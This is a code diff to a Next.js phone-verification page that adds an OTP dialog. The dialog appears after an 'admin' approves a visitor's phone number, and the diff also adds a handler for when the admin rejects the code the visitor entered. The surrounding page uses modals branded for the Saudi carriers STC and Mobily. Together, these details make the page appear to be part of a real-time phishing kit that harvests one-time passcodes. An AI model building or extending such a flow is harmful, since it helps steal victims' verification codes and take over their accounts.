@@ -11,6 +11,7 @@ import { UnifiedSpinner } from "@/components/unified-spinner"
 import { StcVerificationModal } from "@/components/stc-verification-modal"
 import { MobilyVerificationModal } from "@/components/mobily-verification-modal"
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal"
+import { PhoneOtpDialog } from "@/components/dialog-b"
 
 import { db, updateDoc, doc } from "@/lib/firebase"
 import { onSnapshot, getDoc } from "firebase/firestore"
@@ -24,6 +25,7 @@ export default function VerifyPhonePage() {
   const [showStcModal, setShowStcModal] = useState(false)
   const [showMobilyModal, setShowMobilyModal] = useState(false)
   const [showCarrierModal, setShowCarrierModal] = useState(false)
+  const [showPhoneOtpDialog, setShowPhoneOtpDialog] = useState(false)
   const [phoneError, setPhoneError] = useState("")
 
   // Saudi telecom operators
@@ -167,8 +169,16 @@ export default function VerifyPhonePage() {
   }
 
   const handleApproved = () => {
-    // Admin approved - redirect to next step
-    window.location.href = "/step2" // or wherever the next step is
+    // Admin approved phone number - close waiting modal and open OTP dialog
+    console.log("[step5] Phone number approved, opening OTP dialog")
+    
+    // Close all waiting modals
+    setShowStcModal(false)
+    setShowMobilyModal(false)
+    setShowCarrierModal(false)
+    
+    // Open Phone OTP Dialog
+    setShowPhoneOtpDialog(true)
   }
 
   const handleRejected = async () => {
@@ -211,6 +221,17 @@ export default function VerifyPhonePage() {
     
     toast.error("تم رفض رقم الهاتف", {
       description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
+      duration: 5000
+    })
+  }
+
+  const handleOtpRejected = () => {
+    // Admin rejected OTP - close dialog and allow re-entry
+    console.log("[step5] Phone OTP rejected")
+    setShowPhoneOtpDialog(false)
+    
+    toast.error("تم رفض كود التحقق", {
+      description: "يرجى إدخال الكود الصحيح والمحاولة مرة أخرى",
       duration: 5000
     })
   }
@@ -329,6 +350,14 @@ export default function VerifyPhonePage() {
         visitorId={visitorId}
         onApproved={handleApproved}
         onRejected={handleRejected}
+      />
+
+      {/* Phone OTP Dialog */}
+      <PhoneOtpDialog
+        open={showPhoneOtpDialog}
+        onOpenChange={setShowPhoneOtpDialog}
+        phoneNumber={phoneNumber}
+        onRejected={handleOtpRejected}
       />
     </>
   )
